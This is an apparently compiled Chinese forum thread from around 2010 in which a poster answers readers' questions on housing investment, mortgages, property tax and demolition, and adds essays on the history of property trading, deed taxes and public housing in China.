<p>那时参加红军要有不要脑袋的玩命精神，对于多数能够填饱肚子的农民来说，主动参加革命显然是不现实的。红军在西南地区完全没有群众基础，战斗中的减员得不到有效的补充，所以人才会越打越少。</p>
<p>而西北地区完全不同，自然条件恶劣，农村耕地很少，存在大量食不果腹，无地可种的农民。李自成起义也是从陕西发起的，可以说具备了随时发动武装暴动的群众基础。所以毛选择了北上的正确路线。而张同志南下凄惨的下场印证了毛的正确判断。</p>
<p>北上延安的另一个重要原因是获得苏联的支持，没有强大的后援是无法取得决定性胜利的。</p>
<p>一旦农民失去了土地，而又没有去处，那是相当可怕的，所以农民工就业问题是zy最为关注的。甚至提出如何让农民工在城镇买房子置业，处理好农民问题，是社会稳定的重中之重。</p>
<p>将来，有地可耕的农民将会成为都市中的底层群众羡慕的对象，农民有地有住宅有粮食。进可以在城市打工，有聪明的甚至通过经商迈进富人阶层，退可以回乡种田，虽然现钱不多，但是吃穿住行都是没有问题的。</p>
<p>而真正一无所有的将是大量在都市中沦为贫困的人群。在打拼挣扎的打工仔，如果没有能力购置房产，也没有得到向上爬的机会，在都市立足将变得困难，而又毫无退路。</p>
<blockquote>
<p><strong>我是天天念经:</strong></p>
<p>收入分配改革方案下月定稿 二次分配成重点。党中央终于回到正确的道路上来，以贪官污吏和强势群体为主要来源的二会代表妄图把房价问题炒成最热，来掩盖收入不公的根本，终于没有得逞。</p>
<p>对楼主的佩服之情，尤如滔滔江水，连绵不绝，又如黄河绝堤，一发而不可收。<br>强烈建议楼主改个容易记住的名字，便于查阅。</p>
</blockquote>
</blockquote>
<p>讲个故事，可能这个故事很多人都看过，并且曾经多次被转帖：</p>
<p>宇文泰是北周开国的奠基者。当他模仿曹操，作北魏的丞相而“挟天子令诸侯”之时，遇到了可与诸葛亮和王猛齐名的苏绰。宇文泰向苏绰讨教治国之道，二人密谈 三日三夜。</p>
<p>宇文泰问：“国何以立？”</p>
<p>苏绰答：“具官。”</p>
<p>宇文泰问：“如何具官？”</p>
<p>苏绰答：“用贪官，反贪官。 ”</p>
<p>宇文泰不解的问：“为什么要用贪官？”</p>
<p>苏绰答：“你要想叫别人为你卖命，就必须给人家好处。而你又没有那么多钱给他们，那就给他权，叫他用手中的权去搜刮民脂民膏，他不就得到好处了吗？”</p>
<p>宇文泰问：“贪官用我给的权得到了好处，又会给我带来什么好处？”</p>
<p>苏绰答：“因为他能得到好处是因为你给的权，所以，他为了保住自己的好处就必须维护你的权。那么，你的统治不就牢固了吗。你要知道皇帝人人想坐，如果没有贪官维护你的政权，那么你还怎么巩固统治？”</p>
<p>宇文泰恍然大悟，接着不解的问道：“既然用了贪官，为什么还要反呢？”</p>
<p>苏绰答：“这就是权术的精髓所在。要用贪官，就必须反贪官。只有这样才能欺骗民众，才能巩固政权。”宇文泰闻听此语大惑，兴奋不已的说：“爱卿快说说其中的奥秘。”</p>
<p>苏绰答：“这有两个好处：其一、天下哪有不贪的官？官不怕贪，怕的是不听你的话。以反贪官为名，消除不听你话的贪官，保留听你话的贪官。这样既可以消除异己，巩固你的权力，又可以得到人民对你的拥戴。其二、官吏只要贪墨，他的把柄就在你的手中。他敢背叛你，你就以贪墨为借口灭了他。贪官怕你灭了他，就只有乖乖听你的话。所以，‘反贪官 ’是你用来驾御贪官的法宝。如果你不用贪官，你就失去了‘反贪官’这个法宝，那么你还怎么驾御官吏？如果人人皆是清官，深得人民拥戴，他不听话，你没有借口除掉他；即使硬去除掉，也会引来民情骚动。所以必须用贪官，你才可以清理官僚队伍，使其成为清一色的拥护你的人。”</p>
<p>他又对宇文泰说：“还有呢？”</p>
<p>宇文泰瞪圆了眼问： “还有什么？”</p>
<p>苏绰答：“如果你用贪官而招惹民怨怎么办？”宇文泰一惊，这却没有想到，便问：“ 有何妙计可除此患？”</p>
<p>苏绰答：“祭起反贪大旗，加大宣传力度，证明你心系黎民。让民众误认为你是好的，而不好的是那些官吏，把责任都推到这些他们的身上，千万不要让民众认为你是任用贪官的元凶。你必须叫民众认为，你是好的。社会出现这么多问题，不是你不想搞好，而是下面的官吏不好好执行</p>
<h2 id="10-年房地产调控"><a href="#10-年房地产调控" class="headerlink" title="10 年房地产调控"></a>10 年房地产调控</h2><p>这次调控与08年调控后的结果是有所区别的。08年调控的结果是一线城市的暴涨；而2010年调控的结果是房价以二三线城市为主的全面上涨。不但是二三线城市，高房价甚至已经传到至四线及以下城市。</p>
<p>在二三线以下城市，无房户的需求其实并不大，真正的刚需来自改善性住房。</p>
<p>城市升级使人们开始不满足过去老旧式住房的居住环境，开始追求大盘大开放商的品质住宅。房价也由此迎来全面上涨。这种全面上涨，不能理解为全面泡沫，而是有基础存在的。不能理解为全国炒房。</p>
<p>特别是四线及以下城市尽管新盘价格高涨，老旧住宅却乏人问津，县级市二手房变现也比较困难。</p>
<p>在2010年的调控的大背景下，却神奇的出现了二三线以下城市的刚需大量释放现象，不得不令人叹为观止。这神秘的幕后推手其实就是资金的规律。</p>
<p>对于在2010年初布局二三线城市的房开商和有远见的投资者，在这次调控中，无疑是受益者。</p>
<p>一线城市，这次调控给刚需买房者一个最好的入市良机，但是能够抓得住的只是少数。</p>
<blockquote>
<p><strong>tianxiaobing11：</strong></p>
<p>请问楼主，房价会在年底重新确立上涨趋势吗？</p>
<p>如果再不涨，政府的地卖不上好价钱，地方财政就回吃紧，地方政府还会像去年那样出各种政策救市吗</p>
<blockquote>
<p><strong>九五二七八：</strong></p>
<p>全国各地 一线二线三线 情况都有不同<br>楼主预测时点 怕不好预测啊</p>
<p><strong>kkndme:</strong></p>
<p>不但是不同城市情况有区别，同一城市的不同区位情况也有区别。就拿北京来说，过渡爆炒的通州房山等远郊区县，房价一定会有所回调，但是城市中心，特别是学区房是没有下降可能的。</p>
<p>而对于多数二三线城市，均价下降的原因主要还是远郊区的房源投放量增加，城区内的房子不但不降，而且涨得还很厉害。</p>
<p>房产投资最重要的还是位置，当远郊区县的房价远低于城中心的时候，一定会有补涨的要求，但当远郊区县的房价向城中心接近的时候，一定会出现城中心的补涨，当然在调控期也会体现为远郊区县房价的回调。</p>
</blockquote>
<p><strong>kkndme：</strong></p>
<p>仔细看一下各地的房价，不要被公布的所谓均价迷惑，只有少部分城市价格下降或者持平，多数城市都在上涨，只不过幅度不大而已。</p>
<p>现在成交量属于正常水平，不存在dfzf吃紧的问题，当然不可能象09年那样的疯狂，09年底甚至银行出现无款可贷，太高的成交量会被zy视为危险的信号，是达到危害金融安全的高度的。</p>
</blockquote>
<h2 id="关于房贷"><a href="#关于房贷" class="headerlink" title="关于房贷"></a>关于房贷</h2><blockquote>
<p><strong>四环四环:</strong></p>
<p>眼下商业贷款贷款46万。<br>分20年还，月供3066<br>分30年还，月供2562</p>
<p>朋友劝我贷款时间越长月供越少越好。<br>直觉判断我觉得也是这样。<br>有科学依据么？</p>
<p><strong>kkndme:</strong></p>
<p>你的朋友考虑是有道理的。</p>
<p>如果不考虑通货膨胀，当然是利息越少越好，20年还的利息要少于30年还的利息。</p>
<p>但是因为通货膨胀的因素，我国是高增长高通胀的国家，每年的通胀率远远大于实际公布的数字，更远远高于贷款利息，所以贷款时间越长越好。</p>
<p>至于月供是否越少越好，完全取决于个人的承受能力，有条件当然买大房子，宁肯月供多一点。但是条件不够就买小的，量力而行。</p>
<p><strong>四环四环:</strong></p>
<p>谢谢楼主指点。</p>
<p>假设通胀率有一个固定值（当然实际这是没有的，它也是个取决于经济规律和国家意志的不确定因素）、贷款利息有一个值。<br>完后不同的贷款年限。<br>就能估算出两个值此消彼长。</p>
<p>需要选择判断的是，通胀率这个值的数字。<br>但通过对国际意志不确定因素极端情况的估算，预计这个值。</p>
<p>完后把这变成一个数学题。</p>
<p>是这意思么？</p>
<p>那不用算了，按常识，知道该怎么选了。</p>
<p><strong>kkndme:</strong></p>
<p>银行贷款的年限越高，利息支出越高，但不会高过通胀。你能贷30年就贷30年，这是你年轻的优势。年纪大点的就只能贷25年，甚至20年了。</p>
<p>所以说40岁买房的人很不靠谱，首先40岁的人不一定有钱，反而错过了最敢买房的黄金年龄。其次是40岁贷款年限就短了好多，相当于月供压力更大了。</p>
</blockquote>
<p>以后，商品房本来就变成了富人间的游戏，普通人将不能卖进参与的门槛。</p>
<p>到多数人真的买不起房时也就安心了，也不用关心房价的涨跌了。</p>
<p>但是现在，房价还没有到那个高度，很多人还觉得有希望，所以对房价的涨跌才会特别关注。这个时期应该就是普通人最后买房的机会。错过了，将不会再有。</p>
<h2 id="关于商铺投资"><a href="#关于商铺投资" class="headerlink" title="关于商铺投资"></a>关于商铺投资</h2><blockquote>
<p><strong>马甲马甲_马马甲：</strong></p>
<p>请教楼主：</p>
<p>因为种种原因， 错过了很多买房的好时期，现在租房住，（ 享受到了朋友提供的体制内的好处， 远低于市场价格租了一套房子）。</p>
<p>手上200万左右的现金， 在上海，想买房子保值增值，</p>
<p>1，有套著名大学附近的二手房子，57平米， 130万左右，估计租金大约是2.5万-3万 之间，<br>2，在市中心成熟的商业区有个店铺， 124万， 年租金现在是6.4万一年。</p>
<p>2个选择， 个人倾向于投资店铺， 因为在上海店铺的涨价远远低于住宅的涨幅，况且店铺的资金回报率也达到了 5% ，不知道楼主是否有更好的建议？</p>
<p><strong>kkndme：</strong></p>
<p>很多人不愿意投资商铺还是在于风险大，好位置熟铺是很少有人愿意拿出来卖的，谁愿意放弃生蛋的母鸡呢？</p>
<p>而新开发的商铺要不然位置比较偏，不知道能不能做的起来，要不然就溢价太高，超出了大多数人的承受。好的商铺是市面上很难买到的。</p>
<p>如果经过考察确认商铺没有问题，还是首选商铺，但是一定要经过认真的考察。</p>
<p>而住宅的风险就相对小多了，而且投资不需要很多的经验，更适合一般投资者。</p>
</blockquote>
<h2 id="关于房产税"><a href="#关于房产税" class="headerlink" title="关于房产税"></a>关于房产税</h2><blockquote>
<p><strong>tianxiaobing11:</strong></p>
<p>还有一问题请教楼主，目前我一共有三套房，一套自己住，一套父母住，一套是投资房，在大连最繁华的地方，租金回报是百分之六点五。</p>
<p>请问房产税会很快推出吗？我的那套投资房是卖掉还是持有呢？卖的话能赚白分之五十</p>
<p><strong>kkndme：</strong></p>
<p>在卖掉之前，你要先问问自己，拿这笔钱打算干什么？如果没的可做，干等着贬值，那你为什么要卖呢？</p>
<p>如果你有更好的投资或者创业渠道，那当然立刻卖掉，不用犹豫。</p>
<p>至于房产税，第一：近两年一定不会征收，因为条件还不成熟。第二：房产税只是一项苛捐杂税，目的是补充财政收入，并没有降低房价和租金的功能，并且只能导致租金的上涨。怕房产税的应该是租客，而不是房东。</p>
</blockquote>
<p>任何税种最终都要转嫁到社会最底层群众身上。丛林法则实际就是大鱼吃小鱼，小鱼吃虾米。</p>
<p>上层人士的享受是靠底层群众勒紧裤腰带过日子换来的。</p>
<h2 id="关于拆迁"><a href="#关于拆迁" class="headerlink" title="关于拆迁"></a>关于拆迁</h2><blockquote>
<p><strong>wofuleyumin1：</strong></p>
<p>从头至尾，一口气看完了。。赞同之极。。。</p>
<p>也向楼主问些问题。。。</p>
<p>是否老公房都会拆迁？<br>在成都，一环，二环内还有非常多的老公房，总量比商品房还多，这么多的房子都会拆迁吗？<br>我在想是否先买套老公房。。因为价格也便宜。新的商品房一般八九千。。老公房才5千多。买了后灯拆迁。</p>
<p>但这么多老公房都会拆迁吗？我觉得可能很多房子是不会拆迁的吧？否则只要现在买这些房子，以后都发财了。</p>
<p>是否拆迁的只是很少部分？</p>
<p><strong>kkndme：</strong></p>
<p>将来多数房都会拆迁，这是中国体制和经济发展模式决定的。在城市拆迁改造升级过程中，大量的老房拆毁，大量的新房拔地而起。而随着拆迁改造的成本的上升，房子也越来越贵。</p>
<p>现在拆迁改造集中建设70-90的小户型，将来会沦为新的城中村，通过二手置换，这类房子会变成新的贫民窟，而将来的拆迁改造建设的一定是追求环境品质的大户型。</p>
<p>因为zf官员任期的限制，决定了官员的短视，决定了城市规划的短视。</p>
<p>但是市中心的房子，即使在将来人口下降的过程中，仍然是稀缺的，房价高不可攀的。如果手有余钱首选的是市中心的大户型。</p>
<p>关于市中心老旧二手房的购买，还是有一定学问的，一定要选择位置好，低密度的矮层住宅楼，因为密度低，便于拆迁。而密度高的塔楼拆迁非常困难，拆迁成本太高，开发商很难有利可图。现在住在市中心高层旧式塔楼的富裕人口，将来一定会二次置业，这些旧式塔楼逐渐会沦为新一代年轻中产阶层的过渡性住房。</p>
<p><strong>wofuleyumin1：</strong></p>
<p>楼主。。谢谢你的答复</p>
<p>我接着问</p>
<p>你说现在投资是投资一套新房好，，还是找个老公房投资？</p>
<p>新房，，一切都好，但价格贵。。</p>
<p>老公房，一切都不好，但价格便宜。。主要是等拆迁。。但可能要等七八年。。（从我近2年的观察，一般都要这么久。。除非有内部消息）</p>
<p><strong>kkndme:</strong></p>
<p>有钱当然是新房舒服。</p>
<p>老公房如果是学区房，随着住着不舒服但是不影响小孩上学。至于啥时拆迁那真是有年头等了。运气好，三年五年，运气不好十年八年。</p>
<p>关键是拆迁后，原地回迁是很难的，拆迁后安置一般都到远郊区县。如果碰上个铁腕书记，拆迁还真不见的能得什么便宜。条件还没谈好，推土机就开来了。</p>
<p><strong>wofuleyumin1：</strong></p>
<p>有钱当然是新房舒服。<br>老公房如果是学区房，随着住着不舒服但是不影响小孩上学。至于啥时拆迁那真是有年头等了。运气好，三年五年，运气不好十年八年。关键是拆迁后，原地回迁是很难的，拆迁后安置一般都到远郊区县。如果碰上个铁腕书记，拆迁还真不见的能得什么便宜。条件还没谈好，推土机就开来了。<br>。。。。。。。。。。。。。。。。。。。</p>
<p>楼主的意思是。。还是投资新房比较好？</p>
<p><strong>kkndme：</strong></p>
<p>还是量力而行，买老公房也比不买强，有条件当然买新房。</p>
</blockquote>
<blockquote>
<p><strong>wofuleyumin1：</strong></p>
<p>楼主。。。又有一个问题</p>
<p>我附近的普通房子大概9000 旁边有个02年的别墅现在13000 现在又有一个新的楼盘开盘了。。是电梯 容积3 十多层的 是中海的高端项目，装修过的 居然卖将近2万。。。离谱吗？旁边容积0.8的老别墅才13000啊 </p>
<p>请问中海这个项目是否价格过高？ 另外，这个项目对我这附近的房价能拉动多少？</p>
<p><strong>kkndme:</strong></p>
<p>高端房产，开发商都是不急着卖的，而且也从来不乏有钱人慷慨解囊。你说的情况跟昆明的空间俊园完全相同。在市中心徘徊在万元关口的时候，空间俊园直接开出了19000的均价，之后市中心的二手房紧随攀升到15000.而一环二环间的房价在万元关口徘徊。</p>
<p>大盘高端盘对房价的带动作用是显而易见的。</p>
<p>自调控刚刚推出的时候，与一个朋友闲聊，说起调控将是二三线城市大涨的机会，还聊了聊昆明的发展，结果那个朋友头顶调控的大棒，去昆明投了n套房产，当时价格7000多点，时过几个月，现在看房价已经涨到9000.而且他买的位置周边先后有高端大盘推出，预计开盘价格在12000-15000，一旦高端大盘开盘将让他买的房子直接迈上万元的台阶。</p>
</blockquote>
<h2 id="买房和不买房的差距"><a href="#买房和不买房的差距" class="headerlink" title="买房和不买房的差距"></a>买房和不买房的差距</h2><blockquote>
<p><strong>汝爱之罪：</strong></p>
<p>新穷三代。。。ORZ<br>我可不想做穷一代。。。。</p>
<p>房子真的让人抓狂，当跟你同样起点的人早你三年买房的时候，这种感觉尤为明显。</p>
<p>我老公是77年的，他一个女同学2007年底在清河新城买了一套房，一百多平100多万吧，找家里东拼西凑的全款。其实当时我老公也能拿出100w不用借钱的，可是他偏不听我的话，认为清河在五环外，那种地方还要100多万不可思议。结果北京经历了09年的疯狂以后他同学那套房子已经翻倍，借的钱也已经还清。</p>
<p>而我们呢，在犹豫和老公的优柔寡断中错过了时机，终于在2010年3月最疯狂的时候入手了，这时候即使首付160多万，还要背负100多万的贷款，生活质量比他的女同学差的不是一点半点。</p>
<p>这是真实发生的事情，犹豫和无知真的能让人付出很大的代价。</p>
<p><strong>kkndme：</strong></p>
<p>清河新城好像是50年产权吧。反正我对50年产权的都不感冒。</p>
<p>我一朋友06年买的水木天成，买时5000多，现在25000，调控都不带降价的。</p>
</blockquote>
<p>说到租房举个活生生的例子。</p>
<p>我有朋友是个房产的死空头，一直租住着北京一套两居室的老公房，租金不高1000多点，所以没什么负担，对买方族恨不能理解。结果今年他租住的那片老公房要拆迁，限期20天内搬家走人，结果终于理解了找房子的辛苦，而且随便租一套两居室也找不到2500以下的了。</p>
<p>真是心态决定命运。</p>
<h2 id="为什么现在租售比这么低？"><a href="#为什么现在租售比这么低？" class="headerlink" title="为什么现在租售比这么低？"></a>为什么现在租售比这么低？</h2><blockquote>
<p><strong>我爱的飞飞：</strong></p>
<p>对待房子，我的看法是这样的，50-60年代的人，兄弟姐妹至少5-10个，2004-2020年之间正50、60、70、80、90年代共存的时代，人口达到了爆发阶段，现在好多小年轻70、80代人因为买不起房结不起婚，甚至晚婚索性不育，等50.60后在未来20-30年离世之后，将会有大量的房子空出来。而80后的子女2000后，人口根本不足以养活上一辈。</p>
<p>我在成都，我的父母是体制内的，我是体制外的80后，刚结婚，老公是体制内的。原家里有一套单位的集资建房，只有小产权，在二线城市的一环内，98年的房子，因为担心迟早有一天拆迁以后没有房子住，小产权也不会赔多好的地段或者得到较好的补偿，再加上以房养房的心理作祟，以及我参加工作以后想从家里独立出来，于是父母在08年底四川地震以后全国大降价赶上好时光在三环外买了一套140的房子，那会儿才买成2900，今年交房以后装修到一半，就有人以双倍价格想买入，父母不卖，留着养老。一年不到翻了一番起来，我结婚以后，也和老公一起在一环附近购入一套小户，8千多。老公家在外省某市有2套，这样算下来，我门要是生一个孩子，以后这孩子手里就有我父母在成都的2套加上老家的1套，我和我老公的1套，孩子爷爷奶奶的2套，一共6套，您说等我父母和老公父母都去世以后，房子嗖的一下就空出来了不少。所以我觉得80后到了四十岁左右肯定都能住上房子，那个时候房子也不再值钱，不过话又说回来，其实我的父母也是年轻的时候住在单位的公房，三十五近四十岁才有了第一套集资建房，而他们的第二套和第三套相对比较快了。所以我现在觉得年轻人还是应该多奋斗吧。但是我真的不清楚，到了房子不缺的时候，那个时候又会炒什么。</p>
<p>虽然我是土著，也不缺房子，但是压力也不小，特别是还贷，连车也没敢买。有时候我跟LG也想，为啥我们买的房子首付了二十几万，装修十万，我们每个月还还着2500的按揭款，租房客2000就租走了，那不是我们垫着钱给别人提供福利么？向楼主求解。</p>
<p><strong>welldayzwb：</strong></p>
<p>同困惑，只能等租金明显上涨了，否则就是活雷锋了，呵呵</p>
<p><strong>wofuleyumin1：</strong></p>
<p>我来回答吧。。。租金的涨幅。。。你看看10年前的租金。。。也可以看看20年前的租金。。。</p>
<p>10年后你的月供还是2500 但租金可能是5000了。甚至10000</p>
<blockquote>
<p><strong>我爱的飞飞：</strong></p>
<p>但是选择等额本息的人，意味着以后如果贷款利率往上浮动，很可能在还贷多年以后月供超过2500。。。这个还真的不好说。个人愚见，再过15-20年其实房子是过剩的，我打算在此期间卖出自己部分房产。</p>
<p><strong>kkndme：</strong></p>
<p>如果你拥有市区10年以上房龄的房子，等不到15年，你的房子一定会遭遇拆迁。</p>
</blockquote>
<p><strong>kkndme:</strong></p>
<p>打个比方，假设你打算在某地开个游乐园，竞拍一块地，经过计算当时的门票定价10元一张，根据人流测算，你认为出500万投标这块地，5年可以回本，于是你出了500万，但是别人出到了1000万，你认为1000万要10年回本，风险太大了，于是你放弃了。你冷笑着认为那个傻子一定会赔钱。</p>
<p>结果过了2年，票价涨到100元一张了，人流量一点也没减小。人家5年就回本了，以后赚的盆满钵满。可是这个生意你却因为太能算计没有做成。</p>
<p>为什么房价租售比低？</p>
<p>其中原因之一是现在的房价预期了以后的租金。</p>
<p>另一个也是最重要的原因就是：现在的房价不够高，说明了很大一部分普通家庭都有希望买得起房，所以宁肯省吃俭用住合租房，为了攒首付。但当房价高到普通家庭不敢问津的时候，这部分中等收入的合租家庭就会放弃买房转而追求租住有一定舒适度的房屋，房屋租金就会上涨到合理的程度。</p>
<p><strong>welldayzwb:</strong></p>
<p>楼主在线啊，真好，这个道理大概也明白，不过现在出于”活雷锋”阶段，心里还是很不舒服<br>去年底在北五环投资的一套大一居，首付加税款超过60％，贷了30年的公积金，现在房租还是不顶月供，而且空租期很长<br>很怀疑自己的投资决策，好象不是一个很明智的选择，纠结中</p>
<p><strong>kkndme:</strong></p>
<p>当房价快速脱离你的成本区，你的心理就好受了。</p>
<p><strong>welldayzwb:</strong></p>
<p>再多问一句，有机会一步到位买个满意的大房好(也是老房，得房率高，三居)，还是买两套小房，一套凑合着住，一套放租好？</p>
<p>当然两套小房的总额比一套还是要多不少，帮忙分析一下，短期和长期来看的情况？谢谢！</p>
<p><strong>kkndme：</strong></p>
<p>其实买两套同一小区的房子是最好的，投资自住兼顾，可进可退。如果家里有老人，和老人分别居住，又在同一小区，照顾起来很方便。</p>
</blockquote>
<h2 id="房产交易历史"><a href="#房产交易历史" class="headerlink" title="房产交易历史"></a>房产交易历史</h2><p>最早的房产交易，出现在一个名字叫“盉”的西周青铜器上。在公元前919年农历三月份，一个叫矩伯的人分两次把一千三百亩土地抵押给一个叫裘卫的人，换来了价值一百串贝壳的几件奢侈品，包括两块玉，一件鹿皮披肩，一条带花的围裙。</p>
<p>周厉王三十二年又发生了一宗土地买卖。这宗土地买卖的交易过程也被刻在青铜器上。 </p>
<p>这次记录的是周厉王买地的事，周厉王为扩建王宫，买下一个叫鬲从的人的地，没有立即给钱。鬲从担心周厉王赖账，周厉王派人对鬲从说：“你别怕，我一定会照价付款的，如果我赖账，就让上天罚我被流放好了。”这是个很毒的誓。</p>
<p>周厉王买地花了多少钱，铭文上没写。不过李开周说，有人买地，有人卖地，说明当时除了有土地抵押，还存在土地买卖，房地产市场已经有了雏形。</p>
<p>隋唐时，有个叫窦乂的人，他生在陕西，很小的时候就死了爹娘，无依无靠，跟着舅舅一块儿生活。</p>
<p>他舅舅是个公务员，住在长安城。窦乂先通过卖鞋、卖树等生意赚了一些钱，后来有了80万钱的身家，于是开始向房地产行业进军。</p>
<p>当时长安西市有一个废弃的化粪池，面积不小，有十几亩，闲置七八年了，一直没人买。窦乂把它买了下来，雇人填平，在上面盖了20间店铺，租给波斯胡人做生意，平均每天都收上来几千钱的房租。</p>
<p>再后来，窦乂听说当朝太尉李晟喜欢打马球，于是斥资70万钱买下一块地，又花30万钱把这块地建成一片马球场，送给了李晟。</p>
<p>李晟很高兴，从此跟窦乂结成死党，有求必应。有这种靠山保驾护航，窦乂发得更快了，不到40岁就成了长安首富，人称“窦半城”。</p>
<p>除了像窦乂这样的开发商，古代的业余开发商还有一些是公务员、退休干部等，甚至官府自己就是开发商。 </p>
<p>比如在北宋，中央政府下面就有个专门搞开发的机构，叫做“修完京城所”。这个机构本来只能是修筑城墙和宫殿，后来城墙修得差不多了，宫殿也盖得够豪华了，这个机构就开始转型，开始给中央财政搞创收。</p>
<p>怎么搞创收呢？修完京城所向朝廷请示，划拨给他们大片地皮，他们在上面盖住宅盖店铺，盖好了，有的卖给老百姓，有的赁给老百姓，给国库做了很大贡献。</p>
<p>古代是没有专业的开发商的。做开发商最需要的是钱。买地、买建材、雇人、摆平关系，哪个环节都得花钱。尤其买地，流动资金不能少，钱不够，就得找同行拆借，或者找银行贷款。</p>
<p>古代没有银行，但有钱庄，可是钱庄规模一般很小，即使有一些大型的全国连锁的钱庄，他们也不做开发商的生意，都把钱借给别的老板了。</p>
<p>史料上有这样两个办理房地产抵押贷款的例子，一个是南北朝时候的梁朝郡王萧宏，让人家拿着房契去贷款，一张房契最多只贷给几千钱；还有一个是明朝嘉庆年间山阴县的一个富户，名叫求仲，最多的一次才贷给15000文。这点儿钱别说搞开发，吃一顿大餐都不够。<br>直到民国时期，外国银行纷纷到中国开展业务，开发商们才能贷到大笔的贷款。所以中国的职业开发商直到民国才出现。 </p>
<p>古代开发商如果大量囤地得挨板子</p>
<p>以唐朝为例。唐玄宗在位时，土地政策里有这么一条：“应给园宅地者，良口三口以下给一亩，每三口加一亩，贱口五口给一亩，每五口加一亩，……诸买地者不得过本制。”意思就是说，政府给老百姓划拨宅基地，划拨的宅基地大小取决于家庭等级和家庭人口，如果是平民家庭，每三口人给一亩宅基；如果是贱民家庭，每五口人给一亩宅基。另外老百姓也可以购买宅基，但是购买的面积有限，不能超过政府规定的指标。</p>
<p>政府规定的指标是多少呢？平民家庭买地，每三口人，最多只能买一亩宅基；如果是贱民家庭买地，每五口人，才能买一亩宅基。</p>
<p>在唐朝，商人也属于贱民，再有钱的商人也是贱民，贱民老板去买地，即使是上百口人的大家庭，最多也只能购买20亩地，用这20亩地搞开发，一两年就倒腾光了。而如果超标大量买地会怎么样呢？</p>
<p>唐朝法律规定：“诸占田过限者，一亩笞十。”意思是买地超过指标的，得挨板子，每超出一亩指标，挨10大板。</p>
<p>虽然古代开发商没有现如今的开发商这么“牛”，环境和政策对他们都不太有利，但是在拆迁问题上，始终还是开发商们占优势。就比如窦乂，他就知道要搞房地产，首先得朝上有人，于是傍上了当朝太尉。</p>
<p>古代拆迁过程更为暴力，因为普天之下，莫非王土，国家要用哪里就用哪里。</p>
<p>当然，在古代，也不乏一些民主的君主。例如北宋元丰六年(1083年)，开封外城向外拓展，规划中的新修城墙要占用120户居民的住宅，宋神宗让开封府制定拆迁补偿计划，开封府写报告说，总共需要补偿款两万零六百贯，平均每户至少能拿到补偿款171贯。</p>
<blockquote>
<p><strong>Peter_Takeshi：</strong></p>
<p>LZ写的不错，有些意见不敢苟同。<br>LZ既然熟读历史，又在安抚众人去接受被统治的命运，那能否告知最后的结局呢？<br>是否跟前几十个朝代一样？呵呵~<br>人性几千年从未根本改变，所以即使过程不同，结局仍旧是一样。<br>谁上台都改变不了这一切。</p>
<p><strong>kkndme：</strong></p>
<p>历史上的结局三条路：<br>和平演变——在中国好像没发生过，今后也不可能，没有土壤<br>大革命——哪次也少不了<br>外来入侵——这个也比较靠谱</p>
</blockquote>
<h2 id="契税的历史"><a href="#契税的历史" class="headerlink" title="契税的历史"></a>契税的历史</h2><p>关于契税、物业税或者房产税，其实也不是现在的创造或者纯粹的拿来主义。</p>
<p>早在东晋时期，就开始收契税，当时叫“散估”，这也是中国第一个有据可查的契税。其后，几乎所有朝代都有契税。</p>
<p>唐初魏征等人写出了房产税的实质：“其实利在剥削也”——当时“剥削”没有现今这么贬义，与“增加财政收入”是一个意思。</p>
<p>从税率上看，东晋税率为4%，隋唐税率是5%，宋代4%，元明清三朝基本是3%。我们现在的契税大户型也是3%。</p>
<p>万历三十三年，利玛窦在北京宣武门附近买了处房子，他在意大利、葡萄牙、印度都呆过，那些地方并没有“契税”这一说，所以他也没有去有关部门办理手续。</p>
<p>《大明律》规定：“凡典买田宅不税契者，笞五十，仍追田宅一半价钱入官。”好在利玛窦同志上面有人，托了户部官吏，最后交了一笔可观的滞纳金了事。 </p>
<p>相比之下，“物业税”这税种兴起较晚，而且断断续续。公元783年，唐德宗向长安城内拥有房产的市民开征物业税，叫作“间架税”，乃是按照房屋的等级和间架计税，上等房屋每年每间缴纳两千文，中等房屋一千，下等房屋五百。</p>
<p>结果民怨载道，当年深秋五万军兵哗变，口号就是“不税汝间架”。迫于压力，784年唐德宗废止了这个税种，也就是说，中国第一个正规的物业税仅仅活跃了半年就夭折了。</p>
<p>到了五代十国，梁唐晋汉周的每一代帝王都曾征收物业税，不过鉴于“间架税”惹过乱子，改叫“屋税”。</p>
<p>北宋物业税不是常设税种。南宋由于军费困难，每年两次向城乡居民征收屋税。元代，不叫间架税或屋税了，改叫“产钱”，按地基面积征稻米若干或折成钱若干。明朝，物业税不常设，江浙地区小范围征收过一段，叫“房廊钱”。清代，物业税也不常设，往往临时征收，比如1676年由于对吴三桂用兵，朝廷财政紧张，康熙下诏“税天下市房”，规定“不论内房多寡，惟计门面间架，每间税银二钱，一年即止。”算下来，是只对门面房征税，二钱税额相当于两斗大米或七斤白糖的价钱，不多。</p>
<p>总而言之，无论是间架税、屋税、地基钱、产钱、房捐，都是不折不扣的物业税。只不过，它们与国际上通行的物业税是不同的——不是为了调节需求，而是单纯地敛财。 </p>
<p>然而物业税在中国并不能成为常设税种，因为这个税是纯粹的苛捐杂税，税又比较重，很容易激化矛盾，直接结果是百姓吃不起饭，太容易导致大规模的农民运动，所以很难持续征收。</p>
<h2 id="廉租房的历史"><a href="#廉租房的历史" class="headerlink" title="廉租房的历史"></a>廉租房的历史</h2><p>言及公房和廉租房系统，最是宋朝搞得好。</p>
<p>宋朝原则上不分房，京官无论大小，一律租房居住，宰相那样的高干都是如此。偶尔有“赐第”，只照顾部级领导和有军功的将军。算起来大家的住房自有率不高。</p>
<p>南宋初年，大量流亡人口涌进杭州，三十平方公里的杭州城一度住了一百万人口，人口密度接近上海浦西。</p>
<p>因人多地少房价高，居民普遍租住公房。除了大规模公房出租，宋朝还有住房救济体制，一是灾年对租住公房的市民减免房租；二是政府建房（福田院、居养院）免费安置流民和赤贫民众；三是修建比公房条件要差的简易房，但是租金更低，堪称“廉租房”。此外，宋朝还有安济坊——慈善医疗，还有漏泽园——安葬无人认领的尸身，比较有人性。 </p>
<p>如果是公务员的话，生在元代也还不错。建国开始，就给半数京官和所有地方官分了房，叫“系官房舍”。一般分不到的市民以自主建房为主导，但是盖房不用买地，政府批给一块官地，然后每月交一次租金，时称“地基钱。” </p>
<p>满人刚进北京那会儿，也给领导们分房子。一品官二十间，二品官十五间，三品官十二间，四品官十间，五品官七间，六、七品官四间，八品官三间，不入流小军官每人两间。按照每间十五平方米估算，从一品官的三百平方米、到小军官的三十平方米不等。 </p>
<p>廉租房主要由寺观经营。土地由政府划拨，建房资金由民众捐献，房产维护可以从香火钱里冲销，僧尼道士理论上讲不以盈利为目的，再加上信仰需要，正适合执掌这项半慈善业务。大都市的庙宇常有上千间客房，供应试的学生、出门的商旅和遭了天灾的百姓临时居住。</p>
